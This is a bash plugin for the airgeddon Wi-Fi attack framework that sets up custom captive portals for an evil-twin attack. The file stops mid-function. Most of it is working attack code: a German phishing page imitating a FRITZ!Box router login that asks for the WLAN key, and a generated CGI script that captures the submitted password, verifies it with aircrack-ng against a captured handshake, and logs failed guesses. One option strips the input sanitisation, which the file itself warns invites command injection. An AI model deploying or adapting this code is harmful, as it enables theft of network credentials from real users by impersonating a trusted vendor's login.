#!/usr/bin/env bash

# Custom-Portals airgeddon plugin

# Version:    0.2.0
# Author:     KeyofBlueS
# Repository: https://github.com/KeyofBlueS/airgeddon-plugins
# License:    GNU General Public License v3.0, https://opensource.org/licenses/GPL-3.0

# airgeddon Repository: https://github.com/v1s1t0r1sh3r3/airgeddon

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Custom-Portals"
plugin_description="Use Your own captive portals"
plugin_author="KeyofBlueS"

plugin_enabled=1

plugin_minimum_ag_affected_version="10.30"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

################################# USER CONFIG SECTION #################################

# Put Your custom captive portal files in a directory of Your choice
# Default is plugins/custom_portals/PORTAL_FOLDER/PORTAL_FILES
# Example:
custom_portals_dir="${scriptfolder}${plugins_dir}custom_portals/"
# You can have multiple PORTAL_FOLDER, then choose one of them inside airgeddon itself.
# Take a look at custom_portals/<EXAMPLES> for custom captive portal examples.

# *** WARNING ***
# Enabling the detection of passwords containing *&/?<> characters is very dangerous as
# injections can be done on captive portal page and the hacker could be hacked by some
# kind of command injection on the captive portal page.
# ACTIVATE AT YOUR OWN RISK!

############################## END OF USER CONFIG SECTION ##############################

#Copy custom captive portal files.
function custom_portals_override_set_captive_portal_page() {

	debug_print

	if [[ "${copy_custom_portal}" -eq "1" ]]; then
		cp -r "${custom_portals_dir}${custom_portal}/"* "${tmpdir}${webdir}"
		unset copy_custom_portal
	fi

	if [[ ! -f "${tmpdir}${webdir}${jsfile}" ]]; then
		{
		echo -e "(function() {\n"
		echo -e "\tvar onLoad = function() {"
		echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
		echo -e "\t\tif (formElement != null) {"
		echo -e "\t\t\tvar password = document.getElementById(\"password\");"
		echo -e "\t\t\tvar showpass = function() {"
		echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
		echo -e "\t\t\tvar validatepass = function() {"
		echo -e "\t\t\t\tif (password.value.length < 8) {"
		echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t\telse {"
		echo -e "\t\t\t\t\tformElement.submit();"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
		echo -e "\t\t}"
		echo -e "\t};\n"
		echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
		echo -e "})();\n"
		echo -e "function redirect() {"
		echo -e "\tdocument.location = \"${indexfile}\";"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${jsfile}"
	else
		check_ampersand "${et_misc_texts[${captive_portal_language},16]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},16]}*${captive_portal_text}*g" "${tmpdir}${webdir}${jsfile}"
		sed -i "s#\${indexfile}#"${indexfile}"#g" "${tmpdir}${webdir}${jsfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${indexfile}" ]]; then
		{
			echo -e "#!/usr/bin/env bash"
			echo -e "echo -e '<!DOCTYPE html>'"
			echo -e "echo -e '<html lang=\"de\">'"
			echo -e "echo -e '<head>'"
			echo -e "echo -e '<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\">'"
			echo -e "echo -e '<meta http-equiv=\"Cache-Control\" content=\"private, no-transform\">'"
			echo -e "echo -e '<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">'"
			echo -e "echo -e '<meta name=\"format-detection\" content=\"telephone=no\">'"
			echo -e "echo -e '<meta http-equiv=\"x-rim-auto-match\" content=\"none\">'"
			echo -e "echo -e '<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=yes, minimal-ui\">'"
			echo -e "echo -e '<meta name=\"mobile-web-app-capable\" content=\"yes\">'"
			echo -e "echo -e '<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">'"
			echo -e "echo -e '<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black-translucent\">'"
			echo -e "echo -e '<meta http-equiv=\"cleartype\" content=\"on\">'"
			echo -e "echo -e '<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/favicon.ico\">'"
			echo -e "echo -e '<link rel=\"apple-touch-icon\" href=\"/css/rd/logos/logo_fritzDiamond.png\">'"
			echo -e "echo -e '<link rel=\"apple-touch-startup-image\" href=\"/css/rd/logos/logo_fritzDiamond.png\">'"
			echo -e "echo -e '<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
			echo -e "echo -e '<style>'"
			echo -e "echo -e '@font-face {'"
			echo -e "echo -e 'font-family: \"AVM\";'"
			echo -e "echo -e 'src: url(\"/css/rd/fonts/metaWebProBold.woff\") format(\"woff\");'"
			echo -e "echo -e 'font-weight: bold;'"
			echo -e "echo -e '}'"
			echo -e "echo -e '@font-face {'"
			echo -e "echo -e 'font-family: \"Source Sans Pro\";'"
			echo -e "echo -e 'font-style: normal;'"
			echo -e "echo -e 'font-weight: 400;'"
			echo -e "echo -e 'src: url(\"/css/rd/fonts/sourcesanspro.woff\") format(\"woff\");'"
			echo -e "echo -e '}'"
			echo -e "echo -e '@font-face {'"
			echo -e "echo -e 'font-family: \"Source Sans Pro\";'"
			echo -e "echo -e 'font-style: normal;'"
			echo -e "echo -e 'font-weight: 600;'"
			echo -e "echo -e 'src: url(\"/css/rd/fonts/sourcesansproBold.woff\") format(\"woff\");'"
			echo -e "echo -e '}'"
			echo -e "echo -e '@font-face {'"
			echo -e "echo -e 'font-family: \"Hack\";'"
			echo -e "echo -e 'font-style: normal;'"
			echo -e "echo -e 'font-weight: 400;'"
			echo -e "echo -e 'src: url(\"/css/rd/fonts/hack.woff\") format(\"woff\");'"
			echo -e "echo -e '}'"
			echo -e "echo -e 'html, input, textarea, keygen, select, button {'"
			echo -e "echo -e 'font-family: \"Source Sans Pro\", Arial, sans-serif;'"
			echo -e "echo -e 'font-size: 100%;'"
			echo -e "echo -e '}'"
			echo -e "echo -e '.blue_bar_title,'"
			echo -e "echo -e '.logoArea {'"
			echo -e "echo -e 'font-family: \"AVM\", \"Source Sans Pro\", Arial, sans-serif;'"
			echo -e "echo -e '}'"
			echo -e "echo -e '.monospace {'"
			echo -e "echo -e 'font-family: \"Hack\", monospace;'"
			echo -e "echo -e '}'"
			echo -e "echo -e '</style>'"
			echo -e "echo -e ''"
			echo -e "echo -e '<link rel=\"stylesheet\" type=\"text/css\" href=\"/css/rd/login.css\">'"
			echo -e "echo -e '<title>'"
			echo -e "echo -e 'FRITZ!Box'"
			echo -e "echo -e '</title>'"
			echo -e "echo -e '</head>'"
			echo -e "echo -e '<body>'"
			echo -e "echo -e '<script>'"
			echo -e "echo -e '\tvar gNbc = false,'"
			echo -e "echo -e '\tconfig = {\"gu_type\":\"release\",\"GUI_IS_POWERLINE\":false,\"GUI_IS_REPEATER\":false,\"isDebug\":false,\"language\":\"de\"};'"
			echo -e "echo -e '</script>'"
			echo -e "echo -e '<script src=\"/js/browser.js\"></script>'"
			echo -e "echo -e '<script src=\"/js/avmcore.js?lang=de\"></script>'"
			echo -e "echo -e '<script src=\"/js/directPageCall.js\"></script>'"
			echo -e "echo -e '<script src=\"/js/vendor.js\"></script>'"
			echo -e "echo -e '<script src=\"/js/box-login.js\"></script>'"
			echo -e "echo -e '<script src=\"/js/login.js?lang=de\"></script>'"
			echo -e "echo -e '<script>'"
			echo -e "echo -e '\tvar data = {\"firstTenMin\":false,\"challenge\":\"2\$60000\$dbbba1b8307c5b0ed720db31c55f19da\$6000\$b1c9a028c9e18021b8c577fd46064e9d\",\"blockTime\":0,\"pageTitle\":\"Willkommen bei Ihrer FRITZ!Box\",\"lastPage\":\"\",\"firstWizDone\":true,\"loginReason\":0,\"username\":\"fritz0615\",\"abortConfig\":false,\"facTitle\":\"FRITZ!Box Werkseinstellungen\",\"falseUsername\":false,\"showFactoryPasswordHint\":true,\"txt\":{\"forgotPassword\":\"Kennwort vergessen?\",\"hintPassword\":\"Die FRITZ!Box-Benutzeroberfläche ist ab Werk mit einem individuellen Kennwort gesichert. Dieses Kennwort finden Sie auf der Unterseite Ihrer FRITZ!Box.\",\"loginWithPassword\":\"Sie können sich auch %1%showPasswordLink%nur mit dem FRITZ!Box-Kennwort anmelden%\\/1%showPasswordLink%.\",\"facOnAllowedComp\":\"Das Wiederherstellen der Werkseinstellungen starten Sie von einem Computer aus, für den die Internetnutzung in der FRITZ!Box unbegrenzt ist.\",\"pleaseChoose\":\"Bitte wählen ...\",\"loginAgainUserMailPass\":\"Bitte melden Sie sich mit Ihrem Benutzernamen oder Ihrer E-Mail-Adresse und Ihrem Kennwort an.\",\"facNotSet\":\"FRITZ!Box wurde nicht auf Werkseinstellungen zurückgesetzt\",\"loginLinkMailPossibleMyF\":\"Falls Ihre FRITZ!Box bei MyFRITZ! angemeldet ist, wird der Zugangslink auch an die E-Mail-Adresse geschickt, auf die das MyFRITZ!-Konto registriert ist.\",\"notAuthorized\":\"Sie sind momentan als Benutzer %1%Name% angemeldet. Dieser Benutzer hat keine Berechtigung, auf die von Ihnen angeforderten FRITZ!Box-Inhalte zuzugreifen.\",\"autoLogoutLoginAgain\":\"Sie wurden automatisch abgemeldet, bitte melden Sie sich erneut an.\",\"pushNotWorking\":\"Push Service funktioniert nicht?\",\"sendLoginLink\":\"Zugangslink senden\",\"pushLoginRestartExplain\":\"Zur Sicherheit ist die Anmeldung an Ihrer FRITZ!Box nur in einem vorgegebenen Zeitraum möglich. Dieser Zeitraum wurde überschritten.\",\"loginAgainUserPass\":\"Bitte melden Sie sich mit Ihrem Benutzernamen und Ihrem Kennwort an.\",\"waitMore\":\"Bitte warten Sie %1 Sekunden.\",\"facNotAllowed\":\"Das Wiederherstellen der Werkseinstellungen ist gescheitert, da dieser Computer nicht dazu berechtigt ist.\",\"pushLoginRestartBtn\":\"Anmeldevorgang starten\",\"waitOne\":\"Bitte warten Sie 1 Sekunde.\",\"loginWithAnotherUser\":\"Sie können sich auch %1%showUsersLink%mit Ihrem Benutzernamen und Kennwort anmelden%\\/1%showUsersLink%.\",\"chooseUsername\":\"Bitte geben Sie einen Benutzernamen an.\",\"sendPushServiceMail\":\"Push Service Mail senden\",\"facLoseSettings\":\"Beachten Sie bitte, dass beim Zurücksetzen alle Ihre Einstellungen verloren gehen!\",\"mistypedOrNotAuthorized\":\"Haben Sie sich vielleicht vertippt oder fehlt Ihnen die Zugangsberechtigung für diesen Bereich?\",\"pushLoginRestartRequest\":\"Bitte starten Sie erneut den Anmeldevorgang.\",\"back\":\"Zurück\",\"defaultUserHint\":\"Automatisch angelegter Benutzer. Sie können sich mit dem FRITZ!Box-Kennwort anmelden.\",\"login\":\"Anmelden\",\"autoLogoutTimeout\":\"Sie wurden automatisch abgemeldet, da seit längerer Zeit keine Aktivität registriert wurde.\",\"loginMailSent\":\"Die E-Mail mit den Zugangsdaten zur Benutzeroberfläche wurde versendet.\",\"waitTryAgain\":\"Bitte melden Sie sich erneut an.\",\"facDisconnectPower\":\"Trennen Sie die FRITZ!Box für mindestens eine Minute von der Stromversorgung. Nach einer weiteren Minute können Sie erneut auf die Benutzeroberfläche zugreifen. Klicken Sie dann auf \\\"Zur Übersicht\\\".\",\"caution\":\"Achtung\",\"facRepeat\":\"Sie können dann die Werkseinstellungen erneut wiederherstellen.\",\"facNotAllowedOr10Min\":\"Sie haben keine Berechtigung diese Aktion durchzuführen oder Ihre FRITZ!Box ist schon länger als 10 Minuten in Betrieb.\",\"pushBtnWelcome\":\"Bitte drücken Sie kurz eine beliebige Taste an Ihrer FRITZ!Box, um sich anzumelden.\",\"user\":\"Benutzername\",\"loginFailed\":\"Anmeldung fehlgeschlagen.\",\"choose\":\"OK\",\"pass\":\"Kennwort\",\"hint_headline\":\"Hinweis:\",\"setFacDefaults\":\"Werkseinstellungen wiederherstellen\",\"boxPassword\":\"FRITZ!Box-Kennwort\",\"loginBoxPassword\":\"Bitte melden Sie sich mit Ihrem Kennwort an.\",\"loginAgainPass\":\"Bitte melden Sie sich mit Ihrem Kennwort an.\",\"tooManyLogins\":\"Es wurden zu viele Sitzungen gleichzeitig gestartet.\",\"pushNeedsWan\":\"Für den Versand einer Push Service Mail benötigt Ihre FRITZ!Box eine aktive Internetverbindung.\",\"loginLinkMailPossible\":\"Wenn Sie Ihr Kennwort für die Benutzeroberfläche vergessen haben, können Sie sich einen Zugangslink per Push Service Mail senden lassen.\",\"facFailed\":\"Das Wiederherstellen der Werkseinstellungen ist gescheitert.\"},\"cutPowerTxt\":\"Trennen Sie zunächst die FRITZ!Box für mindestens eine Minute vom Strom und kehren Sie auf diese Seite zurück, nachdem Ihre FRITZ!Box neu gestartet ist.\",\"facWhatNextTxt\":\"Nach dem Zurücksetzen werden Sie automatisch auf die Übersichtsseite der FRITZ!Box weitergeleitet.\",\"facPationsTxt\":\"Es kann bis zu 5 Minuten dauern, bis die FRITZ!Box wieder erreichbar ist, bitte haben Sie etwas Geduld.\",\"showUser\":true,\"ifSetFacTxt\":\"Wenn Sie das Kennwort geändert oder vergessen haben, kann die Benutzeroberfläche erst dann wieder geöffnet werden, wenn die FRITZ!Box auf die Werkseinstellungen zurückgesetzt wurde.\",\"fallbackRedirectUrl\":\"http:\\/\\/192.168.178.1\\/\",\"facIsSetTxt\":\"Die FRITZ!Box wird auf Werkseinstellungen zurückgesetzt und startet anschließend neu. Alle Verbindungen gehen dabei kurz verloren.\",\"logoutTxt\":\"\\\"Sie haben sich erfolgreich von der FRITZ!Box abgemeldet.\\\"\",\"bluBarTitle\":\"FRITZ!Box 7510\",\"changedPassTxt\":\"\\\"Das Kennwort wurde geändert.\\\"\",\"pushBtnLogin\":false,\"activeUsers\":[{\"value\":\"fritz0615\",\"text\":\"fritz0615\",\"UID\":\"boxuser89\"}],\"fromInternet\":false,\"pushmailEnabled\":false,\"sid\":\"0000000000000000\"};'"
			echo -e "echo -e '\tif (gNbc) {'"
			echo -e "echo -e '\tdata.nbc = true;'"
			echo -e "echo -e '\t}'"
			echo -e "echo -e '\tfunction localInit() {'"
			echo -e "echo -e '\t\"use strict\";'"
			echo -e "echo -e '\twindow.history.replaceState({}, '', '/');'"
			echo -e "echo -e '\thtml.blueBarHead({'"
			echo -e "echo -e '\t\"type\": \"login\",'"
			echo -e "echo -e '\ttitle: data.bluBarTitle,'"
			echo -e "echo -e '\tparent: document.body'"
			echo -e "echo -e '\t});'"
			echo -e "echo -e '\tlogin.init(data);'"
			echo -e "echo -e '\t}'"
			echo -e "echo -e '\tlocalInit();'"
			echo -e "echo -e '</script>'"
			echo -e "echo -e '<header id=\"blueBarBox\" name=\"\" class=\"\">'"
			echo -e "echo -e '\t<div id=\"\" name=\"\" class=\"logoBox\"></div>'"
			echo -e "echo -e '\t<div id=\"blueBarTitel\" name=\"\" class=\"blue_bar_title\">${essid//[\`\']/}</div>'"
			echo -e "echo -e '\t<div id=\"\" name=\"\" class=\"logoBox fake\"></div>'"
			echo -e "echo -e '</header>'"
			echo -e "echo -e '<div class=\"dialog_outer\">'"
			echo -e "echo -e '\t<div id=\"dialogInner\" class=\"dialog_inner\">'"
			echo -e "echo -e '\t\t<div id=\"dialogHeadBox\" class=\"dialog_head_box fbox\">'"
			echo -e "echo -e '\t\t\t<h2 id=\"dialogTitle\">Willkommen bei Ihrer FRITZ!Box</h2>'"
			echo -e "echo -e '\t\t</div>'"
			echo -e "echo -e '\t\t<div id=\"dialogContent\" class=\"dialog_content\">'"
			echo -e "echo -e '\t\t\t<form method=\"post\" action=\"${checkfile}\" id=\"loginForm\" class=\"loginForm\">'"
			echo -e "echo -e '\t\t\t\t<div class=\"formular\">'"
			echo -e "echo -e '\t\t\t\t\t<p id=\"uiUserLoginText\">Sie wurden automatisch abgemeldet, da seit längerer Zeit keine Aktivität registriert wurde. <p> Bitte melden Sie sich mit Ihrem WLAN-Netzwerkschlüssel an.</p>'"
			echo -e "echo -e '\t\t\t\t\t<br>'"
			echo -e "echo -e '\t\t\t\t\t<p id=\"uiUsernameError\" class=\"ErrorMsg hidden\">Bitte geben Sie einen Benutzernamen an.</p>'"
			echo -e "echo -e '\t\t\t\t</div>'"
			echo -e "echo -e '\t\t\t\t<div class=\"password-input__wrapper\">'"
			echo -e "echo -e '\t\t\t\t\t<label for=\"uiPass\">FRITZ!Box-Netzwerkschlüssel:</label>'"
			echo -e "echo -e '\t\t\t\t\t<div class=\"password-input\"><input tabindex=\"2\" maxlength=\"32\" type=\"password\" name=\"password\" value=\"\" id=\"password\"><i class=\"icon--eye\"></i></div>'"
			echo -e "echo -e '\t\t\t\t</div>'"
			echo -e "echo -e '\t\t\t\t<div id=\"uiLoginError\" class=\"hidden\">'"
			echo -e "echo -e '\t\t\t\t\t<p class=\"error_text\">Anmeldung fehlgeschlagen.</p>'"
			echo -e "echo -e '\t\t\t\t\t<p class=\"error_text\">Haben Sie sich vielleicht vertippt oder fehlt Ihnen die Zugangsberechtigung für diesen Bereich?</p>'"
			echo -e "echo -e '\t\t\t\t\t<p id=\"uiWait\" class=\"error_text\"></p>'"
			echo -e "echo -e '\t\t\t\t</div>'"
			echo -e "echo -e '\t\t</div>'"
			echo -e "echo -e '\t\t<div id=\"btn_form_foot_hide\" class=\"btn_form_foot\"><button type=\"submit\" tabindex=\"3\" id=\"formbutton\">Anmelden</button><a id=\"passwordreset\">Kennwort vergessen?</a></div></form>'"
			echo -e "echo -e '<div id=\"forgotPass\" class=\"forgotPassForm\"><div id=\"setFac\"><p>Die FRITZ!Box-Benutzeroberfläche ist ab Werk mit einem individuellen Kennwort gesichert. Dieses Kennwort finden Sie auf der Unterseite Ihrer FRITZ!Box.</p><p>Wenn Sie das Kennwort geändert oder vergessen haben, kann die Benutzeroberfläche erst dann wieder geöffnet werden, wenn die FRITZ!Box auf die Werkseinstellungen zurückgesetzt wurde.</p><div><span class=\"WarnMsgBold\">Achtung</span><p>Beachten Sie bitte, dass beim Zurücksetzen alle Ihre Einstellungen verloren gehen!</p></div><p>Trennen Sie zunächst die FRITZ!Box für mindestens eine Minute vom Strom und kehren Sie auf diese Seite zurück, nachdem Ihre FRITZ!Box neu gestartet ist.</p></div><div class=\"btn_form_foot\"><button type=\"button\" name=\"cancel\" id=\"cancelForgotPass\">Zurück</button></div></div>'"
			echo -e "echo -e '\t</div>'"
			echo -e "echo -e '</div>'"
			echo -e "echo -e '</div>'"
			echo -e "echo -e '<script>'"
			echo -e "echo -e 'var reset = document.getElementById(\"passwordreset\");'"
			echo -e "echo -e 'reset.addEventListener(\"click\", function showForgotPass(evt) {'"
			echo -e "echo -e 'document.getElementById(\"dialogContent\").style.display = \"none\";'"
			echo -e "echo -e 'document.getElementById(\"btn_form_foot_hide\").style.display = \"none\";  '"
			echo -e "echo -e 'document.getElementById(\"forgotPass\").style.display = \"block\"; '"
			echo -e "echo -e '});'"
			echo -e "echo -e '</script>'"
			echo -e "echo -e '<script>'"
			echo -e "echo -e 'var cancel = document.getElementById(\"cancelForgotPass\");'"
			echo -e "echo -e 'cancel.addEventListener(\"click\", function cancelForgotPass(evt) {'"
			echo -e "echo -e 'document.getElementById(\"dialogContent\").style.display = \"block\";'"
			echo -e "echo -e 'document.getElementById(\"btn_form_foot_hide\").style.display = \"flex\";  '"
			echo -e "echo -e 'document.getElementById(\"forgotPass\").style.display = \"none\"; '"
			echo -e "echo -e '});'"
			echo -e "echo -e '</script>'"
			echo -e "echo -e '</body>'"
			echo -e "echo -e '</html>'"
			echo -e "exit 0"

		} >> "${tmpdir}${webdir}${indexfile}"
	else
		check_ampersand "${et_misc_texts[${captive_portal_language},15]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},15]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},9]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},9]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},10]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},10]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},11]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},11]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},12]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},12]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},13]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},13]}*${captive_portal_text}*g" "${tmpdir}${webdir}${indexfile}"
		check_ampersand "${essid}"
		sed -i "s#\${essid}#${captive_portal_text//[\`\']/}#g" "${tmpdir}${webdir}${indexfile}"
		sed -i "s#\${cssfile}#"${cssfile}"#g" "${tmpdir}${webdir}${indexfile}"
		sed -i "s#\${jsfile}#"${jsfile}"#g" "${tmpdir}${webdir}${indexfile}"
		sed -i "s#\${checkfile}#"${checkfile}"#g" "${tmpdir}${webdir}${indexfile}"
		if grep -q "ESSID_HERE" "${tmpdir}${webdir}${indexfile}"; then
			if echo "${essid}" | grep -Fq "&"; then
				essid=$(echo "${essid}" | sed -e 's/[\/&]/\\&/g')
			fi
			sed -i "s/ESSID_HERE/${essid//[\`\']/}/g" "${tmpdir}${webdir}${indexfile}"
		fi
		if cat "${tmpdir}${webdir}${indexfile}" | grep -q "TITLE_HERE"; then
			sed -i "s/TITLE_HERE/${et_misc_texts[${captive_portal_language},15]}/g" "${tmpdir}${webdir}${indexfile}"
		fi
	fi

	if [[ ! -f "${tmpdir}${webdir}${checkfile}" ]]; then
		exec 4>"${tmpdir}${webdir}${checkfile}"

		cat >&4 <<-EOF
			#!/usr/bin/env bash
			echo '<!DOCTYPE html>'
			echo '<html>'
			echo -e '\t<head>'
			echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
			echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
			echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
			echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
			echo -e '\t</head>'
			echo -e '\t<body>'
			echo -e '\t\t<div class="content">'
			echo -e '\t\t\t<center><p>'
		EOF

		cat >&4 <<-'EOF'
			POST_DATA=$(cat /dev/stdin)
			if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
				POST_DATA=${POST_DATA#*=}
				password=${POST_DATA/+/ }
				password=${password//[*&\/?<>]}
				password=$(printf '%b' "${password//%/\\x}")
				password=${password//[*&\/?<>]}
			fi

			if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
		EOF

		cat >&4 <<-EOF
				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
		EOF

		cat >&4 <<-'EOF'
				echo "${password}" >\
		EOF

		cat >&4 <<-EOF
				"${tmpdir}${webdir}${currentpassfile}"
				aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
		EOF

		cat >&4 <<-'EOF'
				if [ "$?" = "0" ]; then
		EOF

		cat >&4 <<-EOF
					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
					echo '<h1>${et_misc_texts[${captive_portal_language},18]}</h1>'
					et_successful=1
				else
		EOF

		cat >&4 <<-'EOF'
					echo "${password}" >>\
		EOF

		cat >&4 <<-EOF
					"${tmpdir}${webdir}${attemptsfile}"
					echo '<h1>${et_misc_texts[${captive_portal_language},17]}</h1>'
					et_successful=0
				fi
		EOF

		cat >&4 <<-'EOF'
			elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
		EOF

		cat >&4 <<-EOF
				echo '${et_misc_texts[${captive_portal_language},26]}'
				et_successful=0
			else
				echo '${et_misc_texts[${captive_portal_language},14]}'
				et_successful=0
			fi
			echo -e '\t\t\t</p></center>'
			echo -e '\t\t</div>'
			echo -e '\t</body>'
			echo '</html>'
		EOF

		cat >&4 <<-'EOF'
			if [ ${et_successful} -eq 1 ]; then
				exit 0
			else
				echo '<script type="text/javascript">'
				echo -e '\tsetTimeout("redirect()", 3500);'
				echo '</script>'
				exit 1
			fi
		EOF

		exec 4>&-
	else
		check_ampersand "${et_misc_texts[${captive_portal_language},15]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},15]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},18]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},18]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},17]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},17]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},26]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},26]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		check_ampersand "${et_misc_texts[${captive_portal_language},14]}"
		sed -i "s*\${et_misc_texts\[\${captive_portal_language},14]}*${captive_portal_text}*g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${cssfile}#"${cssfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${jsfile}#"${jsfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${bssid}#"${bssid}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${tmpdir}#"${tmpdir}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${webdir}#"${webdir}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${currentpassfile}#"${currentpassfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${et_handshake}#"${et_handshake}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${et_successfile}#"${et_successfile}"#g" "${tmpdir}${webdir}${checkfile}"
		sed -i "s#\${attemptsfile}#"${attemptsfile}"#g" "${tmpdir}${webdir}${checkfile}"
	fi


	if [[ "${custom_portals_full_password}" = "true" ]]; then
		echo
		language_strings "${language}" "custom_portals_text_11" "red"
		if grep -Fq 'password=${password//[*&\/?<>]}' "${tmpdir}${webdir}${checkfile}"; then
			lines_to_delete="$(grep -Fn 'password=${password//[*&\/?<>]}' "${tmpdir}${webdir}${checkfile}" | awk -F':' '{print $1}')"
			for line_to_delete in ${lines_to_delete}; do
				lines_to_delete_argument="${lines_to_delete_argument}${line_to_delete}d;"
			done
			sed -i "${lines_to_delete_argument}" "${tmpdir}${webdir}${checkfile}"
		fi
		unset custom_portals_full_password
	fi

	sleep 3
}

#Chek for ampersand to escepe
function check_ampersand() {

	captive_portal_text="${1}"

	if echo "${captive_portal_text}" | grep -Fq "&"; then
		captive_portal_text=$(echo "${captive_portal_text}" | sed -e 's/[\/&]/\\&/g')
	fi
}

#Custom captive portal selection menu
function custom_portals_prehook_set_captive_portal_language() {

	debug_print

	standard_portal_text="this_is_the_standard_portal_text"
	while true; do
		clear
		language_strings "${language}" 293 "title"
		print_iface_selected
		print_et_target_vars
		print_iface_internet_selected
		echo
		language_strings "${language}" "custom_portals_text_0" "green"
		print_simple_separator

		echo "${standard_portal_text}" > "${tmpdir}ag.custom_portals.txt"
		ls -d1 -- "${custom_portals_dir}"*/ 2>/dev/null | rev | awk -F'/' '{print $2}' | rev | sort >> "${tmpdir}ag.custom_portals.txt"
		local i=1
		while IFS=, read -r exp_folder; do

			if [[ -d "${custom_portals_dir}${exp_folder}" ]] || [[ "${exp_folder}" = "${standard_portal_text}" ]]; then
				if [[ "${exp_folder}" = "${standard_portal_text}" ]]; then
					language_strings "${language}" "custom_portals_text_1"
				else
					i=$((i + 1))

					if [ ${i} -le 9 ]; then
						sp1=" "
					else
						sp1=""
					fi

					portal=${exp_folder}
					echo -e "${sp1}${i}) ${portal}"
				fi
			fi
		done < "${tmpdir}ag.custom_portals.txt"

		unset selected_custom_portal
		echo
		if ! cat "${tmpdir}ag.custom_portals.txt" | grep -Exvq "${standard_portal_text}$"; then
			language_strings "${language}" "custom_portals_text_2" "yellow"
			language_strings "${language}" "custom_portals_text_3" "yellow"
			echo_brown "${custom_portals_dir}PORTAL_FOLDER/PORTAL_FILES"
		fi
		read -rp "> " selected_custom_portal
		if [[ ! "${selected_custom_portal}" =~ ^[[:digit:]]+$ ]] || [[ "${selected_custom_portal}" -gt "${i}" ]] || [[ "${selected_custom_portal}" -lt 1 ]]; then
			echo
			language_strings "${language}" "custom_portals_text_4" "red"
			language_strings "${language}" 115 "read"
		else
			break
		fi
	done
	if [[ "${selected_custom_portal}" -eq 1 ]]; then
		copy_custom_portal=0
		custom_portal='Standard'
	else
		copy_custom_portal=1
		custom_portal="$(sed -n "${selected_custom_portal}"p "${tmpdir}ag.custom_portals.txt")"
	fi
	rm "${tmpdir}ag.custom_portals.txt"

	while true; do
		clear
		language_strings "${language}" 293 "title"
		print_iface_selected
		print_et_target_vars
		print_iface_internet_selected
		echo
		language_strings "${language}" "custom_portals_text_5" "yellow"
		echo_yellow "${custom_portal}"
		echo 
		language_strings "${language}" "custom_portals_text_6" "green"
		language_strings "${language}" "custom_portals_text_7" "red"
		print_simple_separator
